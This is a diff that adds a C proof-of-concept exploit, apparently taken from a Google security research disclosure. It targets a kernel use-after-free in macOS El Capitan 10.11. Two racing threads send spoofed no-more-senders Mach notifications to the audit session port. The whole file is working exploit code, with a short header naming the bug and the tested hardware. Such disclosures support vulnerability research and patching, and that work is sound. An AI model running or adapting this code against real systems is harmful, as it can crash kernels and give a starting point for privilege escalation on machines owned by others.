@@ -1,0 +1,89 @@
+/*
+Source: https://code.google.com/p/google-security-research/issues/detail?id=567
+
+Kernel UaF due to audit session port failing to correctly account for spoofed no-more-senders notifications
+
+Tested on ElCapitan 10.11 (15a284) on MacBookAir 5,2
+*/
+
+
+// ianbeer
+
+/*
+Kernel UaF due to audit session port failing to correctly account for spoofed no-more-senders notifications
+*/
+
+#include <stdio.h>
+#include <stdlib.h>
+
+#include <mach/mach.h>
+#include <mach/thread_act.h>
+
+#include <pthread.h>
+#include <unistd.h>
+
+#include <IOKit/IOKitLib.h>
+
+#include <bsm/audit.h>
+
+io_connect_t conn = MACH_PORT_NULL;
+
+int start = 0;
+
+struct spoofed_notification {
+  mach_msg_header_t header;
+  NDR_record_t NDR;
+  mach_msg_type_number_t no_senders_count;
+};
+
+struct spoofed_notification msg = {0};
+
+void send_message() {
+  mach_msg(&msg,
+           MACH_SEND_MSG,
+           msg.header.msgh_size,
+           0,
+           MACH_PORT_NULL,
+           MACH_MSG_TIMEOUT_NONE,
+           MACH_PORT_NULL);
+}
+
+void go(void* arg){
+
+  while(start == 0){;}
+
+  usleep(1);
+
+  send_message();
+}
+
+int main(int argc, char** argv) {
+  mach_port_t conn = audit_session_self();
+  if (conn == MACH_PORT_NULL) {
+    printf("can't get audit session port\n");
+    return 0;
+  }
+
+  pthread_t t;
+  int arg = 0;
+  pthread_create(&t, NULL, (void*) go, (void*) &arg);
+
+  // build the message:
+  msg.header.msgh_size = sizeof(struct spoofed_notification);
+  msg.header.msgh_local_port = conn;
+  msg.header.msgh_remote_port = conn;
+  msg.header.msgh_bits = MACH_MSGH_BITS(MACH_MSG_TYPE_COPY_SEND, MACH_MSG_TYPE_COPY_SEND);
+  msg.header.msgh_id = 0106;
+  
+  msg.no_senders_count = 1000;
+
+  usleep(100000);
+
+  start = 1;
+
+  send_message();
+
+  pthread_join(t, NULL);
+
+  return 0;
+}
